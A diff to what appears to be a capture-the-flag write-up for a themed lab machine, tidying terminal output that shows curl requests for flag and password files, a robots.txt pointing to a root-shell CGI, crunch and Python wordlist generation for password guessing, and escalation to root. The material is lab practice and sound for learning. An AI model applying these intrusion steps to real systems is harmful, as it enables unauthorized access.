@@ -122,7 +122,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
     DOWNLOADED: 4612 - FOUND: 3
 
 
-    └─$ curl http://192.168.56.10/passwords/FLAG.txt                                           1 ⨯
+    └─$ curl http://192.168.56.10/passwords/FLAG.txt
     FLAG{Yeah d- just don't do it.} - 10 Points
 
     └─$ curl http://192.168.56.10/passwords/passwords.html
@@ -136,7 +136,7 @@ Nmap done: 1 IP address (1 host up) scanned in 31.60 seconds
     </html>
 
 
-    └─$ curl http://192.168.56.10/robots.txt                                                 127 ⨯
+    └─$ curl http://192.168.56.10/robots.txt
     They're Robots Morty! It's ok to shoot them! They're just Robots!
 
     /cgi-bin/root_shell.cgi
@@ -211,12 +211,13 @@ crunch 10 10 -t ,%Curtains -O >> dict.txt
 crunch 7 7 -t ,%Flesh -O >> dict.txt
 
 
-
+```python
 from string import ascii_uppercase
 for c in ascii_uppercase:
     for x in range(0, 10):
         print str(c) + str(x) + "Flesh"
         print str(c) + str(x) + "Curtains"
+```
 
 [RickSanchez@localhost home]$ sudo su
 [root@localhost home]# id
